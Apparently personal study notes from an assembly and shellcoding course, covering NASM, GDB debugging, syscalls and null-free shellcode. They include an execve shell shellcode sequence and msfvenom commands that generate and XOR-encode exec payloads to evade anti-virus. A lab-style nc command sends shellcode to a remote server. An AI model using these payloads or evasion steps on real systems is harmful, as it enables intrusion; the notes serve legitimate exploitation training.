# Theory
- What is Directive?
    - `global _start` >> as an example to **guide the machine where to start to execute the
        instructions.**

- What is a Label?
    - symbolic names for memory addresses
    - each label can be referred to by instructions or by directives
    - `_start` is the label example

- **Important:**
    - `text` segment >> read-only   >> cannot write any variables in it
    - `data` segment >> read/write >> but not executable

# Assembling
- Firstly, it is assembled:
    - `nasm` tool >> used to assemble the assembly language code
        - `assembly extensions: .s or .asm`
        - `nasm -f elf64 helloWorld.s` >> to assemble & generate object file
            - elf >> executable and linkable format
- Secondly, file is linked:
    - `ld` tool >> used to utilize OS features & libraries
        - `ld -o helloWorld helloWorld.o` >> it's for 64-bit binary
- Thirdly, we run the program >> that's all of assembling


# Disassembling
- Firstly, **objdump** tool >> used to `dumps machine code` from a file & `interprets the assembly`
    instruction of each hex code:
    - `-d` flag is used to disassemble
    - `-M intel` flag to specify the syntax
    - Command: `objdump -d -M intel helloWorld` >> starts the game
    - Flags: `--no-show-raw-insn` and `--no-addresses` used to **see only assembly code**
    - Flags: `-s` to dump any strings, `-j` to only examine the certain section:
        - `objdump -sj .data helloWorld`

# GNU Debugger
- debugger for `Linux programs`
    - Others **Linux Debuggers:**  >> `Radare`, `Hopper`
    - **Windows Debuggers:**  >> `Immunity Debugger`, `WinGDB`

- **GEF** >> open-source GDB plugin for `reverse engineering & binary exploitation`

- **Commands:**
    - `info functions` /  `info variables`   /  `disas function_name`


# Debugging
- Four Key Parts:
    - `Break` >>  `Examine`  >>  `Step`  >> `Modify`

- **Break:**
    - `b _start` >> break on functions, look for symbol
    - `b *_start` >> break on function's memory address
    - **:*:** >> used to access to *memory address*
    - `b *_start+17` >> after _start +17 bytes
        - GDB will calculate the memory address of _start and then add 18 bytes to that address._
        -
    - `info b` >> `delete breakpoints` >> disable >> enable

- **Examine:**
    - **x/FMT ADDRESS**
        - `FMT` is the format
            - *Count:* >> number of times we want to repeat the examine
            - *Format:* >> `x`(hex) >> `s`(string) >> `i`(instruction)
            - *Size:* >> `b`(byte) >> `h`(halfword) >> `w`(word) >> `g`(giant)
            -
            - `x/4ig $rip`
            - `x/s 0x402000` >> shows the string value at this address
            - `x/iw 0x401000` >> it shows instruction value at this address >> *mov eax, 0x1*
            -
            - `x/xw 0x401000` >> shows the hex value at this address
            - instead of `mov eax, 0x1` we get `0x000001b8` >> hex vers in Little-Endian format
            - >> This is read as: b8 01 00 00.
            - `ADDRESS` is an address or register
- **Step:**
    - stepping through the program
    - `si` >> step instructions >> goes to the next assembly instruction
    - `s` >> continues till the end
    - `si` VS `ni`
    - If there is a call to another function within this function
        - `si` >> *breaks at the start of another function*
        - `ni` >> **skips the calls to other functions**
- **Modify:**
    - `set` in GDB
    - `patch` in GEF >> Syntax: `patch type ADDRESS Values`
    - Example: `patch string 0x402000 "Patched!\\x0a"`
        - This changes the value in the given address: 0x402000 to the given val
        - Then we add also `set $rdx=0x9` this is for address of new string, `9 bytes or chars`
    - break *_start+16
    - run
    - patch string 0x402000 "Hell Yeah!\\x0a"
    - set $rdx=0x11
    - continue
    - `\\x0a` to say a newline

# Data Movement
- **mov:** >> to move data or load immediate data
    - `mov rax, 1` >> rax = 1

- **lea:** >> load an address pointing to the value
    - `lea rax, [rsp+5]` >> rax = rsp+5 >> here rax is equal to the pointing address to value,
    - *Not value itself*

- **xchg:** >>  swap data between two registers or addresses
    - `xchg rax, rbx` >> rax = rbx, rbx = rax

- **More efficient to use a register size that matches our data size**
    - 1 byte register for 1 byte data >> `mov al, 1`

- **Address Pointers**
    - These pointers are points to the value in memory
    - They do not contain final value
    - Why we need them >> since big data in memory cannot be placed in registers only 8bytes or
        64-bits can be in registers. That's why for the bigger size data, we take **pointers** to
        them and find them.

    - **Pointer Registers:** `rsp`, `rbp`, `rip`
        - `mov rax, rsp` >> moves the `pointer address` to rax `not final value`
        - `mov rax, [rsp]` >> moves the final value which pointer is pointing
        - **[]** >> use this to move final values

- **Loading Value Pointers**
    - *lea*: Load Effective Address
    - `lea rax, [rsp]` == `mov rax, rsp` >> does the same job: move pointer address
    - **Key Moment & Difference**
        - With *Offset* we cannot use `mov` to load pointer address, we use `lea`
        - `lea rax, [rsp+10]` >> loaded `the address` that is 10 addresses away from rsp (in other words, 10 addresses away from top of stack)
        - `mov rax, [rsp+10]` >> this loads the `final value` but **not pointer address**

- **rsp:**
    - points to the `last pushed address` or `value` in stack

# Arithmetic Instructions
- Split into two: `Unary` (takes only one operand) & `Binary` (takes two operands)

- **Unary:**
    - `inc` >> incrementing >> `inc rax` -> rax = rax + 1 ou rax++
    - `dec` >> decrementing >> `dec rax`

- **Binary:**
    - `instruction destination, source` >> *result* in **destination** oper, not **source**

    - `add rax, rbx`      >> rax = rax + rbx
    - `sub rax, rbx`      >> rax = rax - rbx
    - `imul rax, rbx`     >> rax = rax * rbx

- **Bitwise Instructions**
    - `not`     >> invert all bits, (0->1 and 1->0)
    - `and`     >> (if both bits 1->1, if different, -> 0)
    - `or`      >> (if either bit 1 -> 1, if both 0 -> 0)
    - `xor`     >> (if bits the same -> 0, if different -> 1)

    - `xor rax, rax` >> efficient way to `make 0` when both are the same

# Control Instructions
- Loops
- Branching
- Function Calls

# Loop globally available function written in `C` provided by OS Kernel
- OS Kernel function
- takes arguments in registers and executes the function with given args

- Linux Syscalls
    - available full list: `unistd_64.h` >> this system file >> contains all syscalls with `numbers`
    - these `numbers` used to identify the syscalls by OS Kernel

- **How to call syscalls?:**
    1. Find the `number` of syscall you need:
    2. Go to the `man 2 syscall_name` to find the required args >> 2 section of `man` > for syscalls
    3. Now you know what args need to send.

- **Syscall Calling Convention:**
    1. Save registers to Stack
    2. Set its syscall number in `rax`
    3. Set its arguments in registers
    4. Use `syscall` assembly instruction to call it

- **Registers: for Syscall Args**
    - `rax` is for syscall number
    - 1st arg >> `rdi`
    - 2nd arg >> `rsi`
    - 3rd arg >> `rdx`
    - 4th arg >> `rcx`
    - 5th arg >> `r8`
    - 6th arg >> `r9`

    - We call `write syscall`: 3 args >> fd, buffer, length
    mov rax, 1
    mov rdi, 1
    mov rsi, message
    mov rdx, 20
    syscall

# Procedures
- used for code refactoring >> straightforward than functions
- we call it whenever we need it >> avoid code repetition

- `call` used to call the procedure
    - before jumping to the section of the code
    - this stores, `push`es `rip` >> next instruction in top of the Stack >> in `rsp`
    - then after finishing its section:
- `ret` used to `pop` the `rip` from the stack >> from `rsp`
    - through this way, `ret` in the procedure makes sure the flow of the code exec

- **Steps:**
    1. Define the procedure
    2. Call it >> finish it and Return

    _start:
        call initFib

    initFib:
        xor rax, rax
        xor rbx, rbx
        inc rbx
        ret

# Functions
- **Functions Calling Convention:**
    1. Save Registers on the Stack
    2. Pass Function Args (like syscalls)
    3. Fix Stack Alignment
    4. Get Function's Return Val in RAX

    `call function_name` >> how we call it

- *Calling printf*
    - `extern printf` to get it from libc
    - follow the calling convention

- **Stack Alignment:**
    - Whenever we want to make a call to a function, we must ensure that the Top Stack Pointer (rsp) is aligned by the
    - `16-byte` boundary from the _start function stack._
    - have to push `at least 16-bytes` **(or a multiple of 16-bytes)** to the stack
    - before making a call to ensure functions `have enough stack space` to execute correctly.
    - is mainly there for processor performance efficiency.
    - Some functions (like in libc) are programed to crash if this boundary is not fixed

- **How to calculate those bytes?**
    - each procedure `call` >> adds 8-byte address to the stack later removed by `ret`
    - each `push` >> adds 8-bytes to the stack as well
    - We can count the number of (unpoped) `push instructions` and (unreturned) `call instructions`, and
    - we will get how many `8-bytes have been pushed to the stack`.

    - if we want to bring the boundary up to 16 bytes: we do this:

      sub rsp, 16    >> through this we are making bigger stack size, by stack pointer register
      call function
      add rsp, 16    >> through this we are making smaller the stack size by adding

      This way, we are adding an extra 16-bytes to the top of the stack and then removing them after the call.

- **Interesting: Stack Shrinking & Increasing:**
    - Stack architecture >> high level addresses are at the bottom and low-level addresses are at
        the top
    - Stack increases from the bottom to top >> means that
    - if we want to make bigger stack we have
        to make it smaller >> substraction >> it goes up to the low-level addresses
    - if we want to make smaller stack we have
        to make it bigger >> addition >> it goes down to the high-level addresses

- **Dynamic Linker:**
    - `-lc --dynamic-linker /lib64/ld-linux-x86-64.so.2` >> to include libc libraries
    - `ld fib.o -o fib -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2`

# Shellcodes
    - hex representation of a binary's executable machine code
    - if passed to processor memory, will be executed

    - reverse shell shellcode >>
    - `Binary Exploitation`

    - direct execution in memory
    - each instructions has its own hex value

- **Tools:**
    - `pwntools` >> `pwn asm 'push rax' -c 'amd64'` >> to assembly code into shellcode
    - `pwn disasm '50' -c 'amd64'` >> to disassemble

- **Info:**
    - A binary's shellcode represents only `.text` section
    - Linux Binary >> `ELF`
- **Extracting Shellcodes**
    - python3 env >> pwn >> ELF library to load an elf binary >> code

- **GCC:**
    - To build shellcode into a elf executable >> with C code
    - **Warning Flags:**
        - C code includes other C libraries as well not only shellcode
        - `gcc helloworld.c -o helloworld -fno-stack-protector -z execstack -Wl,--omagic -g --static`
        - to avoid some memory protections

# ShellCodes Techniques
- **Requirements:**
    1. No variables
    2. No referring to direct memory addresses
    3. No NULL bytes 00 (terminators)

- **No Variables:**
    - Moving immediate strings to registers
    - Pushing strings to the Stack and then use them

    - `push` is *dword* >> 4 bytes
    - store the string in register (8bytes) >> then push to Stack
    mov rbx, 'y!'
    push rbx
    mov rbx 'B Academ'
    push rbx
    mov rbx, 'Hello HT'
    push rbx
    mov rsi, rsp        >> Key moment here, rsi now takes the pointer to the memory address of the
    last push. Interestingly, we do not use "Null" pointer to stop the string reading that's why
    `rsp` gives us the full string composed of chunks >> also, we define length later
    The point here is that as no here "string null terminator" we can read the whole block of the
    data

- **No Memory addresses:**
    - `call 0xffffffffaa8a25ff` >> no such thing

    - `call 0x401020` >> okay with relative memory address
    - `call loopFib` >> okay with labels also

    - `relative address` >> offset >> relative to some address rip, rsp or rbp and starts from there

- **No NULL:**
    - NULL characters (or 0x00) are used as string terminators in assembly and machine code
    - happens when moving a `small integer into a large register`, so the integer gets padded with `an extra 00` to fit the larger register's size.

    - **we must use registers that match our data size**
    - not >> `mov rax, 1` >> but >> `mov al, 1`
    - before need to clear out the entire register by zero-out >> `xor rbx, rbx` >> all 64-bits
    xor rax, rax
    mov al, 1
    xor rdi, rdi
    mov dil, 1
    xor rdx, rdx
    mov dl, 18
    syscall

    xor rax, rax
    add al, 60
    xor dil, dil
    syscall


 If we ever `need to move 0 to a register`, we can `zero-out that register`, like we did for rdi above.
 Likewise, if we even need to `push 0 to the stack` (e.g. for String Termination) we can `zero-out any register,`
 and then push that register to the stack.

# Shellcodes Tools
- shellcode >> matches >> OS & Processor Arch
- `execve` >> syscall >> used to execute system application
-
- `execve("/bin//bash", ["bin//bash"], NULL)` >> need to write it in assembly
- mov al, 59
- xor rdx, rdx
- push rdx
- mov rdi, '/bin//bash'
- push rdi
- mov rdi, rsp
- push rdx
- push rdi
- mov rsi, rsp
- syscall
-
-
- **How to avoid:** `push 0` terminator? >> We can zero-out rdx with xor, and then push it for string terminators instead of pushing 0:
-
-
- >> extra `/` will be ignored by Linux

- Creating Shellcrafts:
-  shellcraft library, which generates a shellcode for various syscalls. We can list syscalls the tool accepts as follows:
-
- `pwn shellcraft -l 'amd64.linux'` >> `pwn shellcraft amd64.linux.sh`
- ` pwn shellcraft amd64.linux.sh -r` >> to run it

- **Msfvenom:**
- msfvenom, which is another common tool we can use for shellcode generation
- `msfvenom -l payloads | grep 'linux/x64'`
-
- **The exec payload allows us to execute a command we specify. Let's pass '/bin/sh/' for the CMD, and test the shellcode we get:**

- `msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'`

# Shell Encoding
-  handy feature for systems with anti-virus or certain security protections.
-  use msfvenom to encode our shellcodes as well
-  `msfvenom -l encoders`
-  `msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'`
-  with -e flag 'x64/xor' is our encoder
-
-  We can encode our shellcode multiple times with the `-i COUNT` flag
-
-  encoded shellcode is always significantly larger than the non-encoded one
-  **Because: since encoding a shellcode adds a built-in decoder for runtime decoding**
-
# Practical
- `msfvenom -p 'linux/x64/exec' CMD='cat /flag.txt' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'` >>
- with specified command:

- `nc 94.29.239.23 49100 < shellcode.txt` >> to send the remote server shellcode to be executed

# Assessments
- **Task #1**
    - What I did
    - I pushed the values to the stack, each 8 byte
    - mov rdx, rsp >> rdx now points to the top of the stack
    - add rdx, 8 >> moved rdx to loop through the stack for the next values
    - I did xor with rdx value >> manually copied xored hash from gdb to the .txt file in notepad
    - I also created a buffer to store this 8 byte value
    - Then after running the loop for 14 times, I got all the xored or decoded hex values starting
        from the last one till the first one (stack styly LIFO)
    - Then, I concotenated all the hash values together for full shellcode
    - Then, I run pwn tools with loader.py
    - run_shellcode(unhex(sys.argv[1])).interactive()
    - This does the job >> I got the flag
    -
    - In short, I trace the pushed values from the back side >> xored them >> store the decoded
        message >> combine all together for the final shellcode >> run shellcode >> Voila le result

- **Task #2**
    - I optimized the flag.s with working lower register: subregisters to assign the smaller values
    - mov al, 8
    - instead of `0` value >> I use `xor` technique >> it reduced by 10 bytes
    - Then, I used msfvenom tool >> with payload `exec` for the `cmd` >> `cat /flg.txt` >> then
    - I sent it with `nc` the shellcode >> I got the flag. Voila
    -














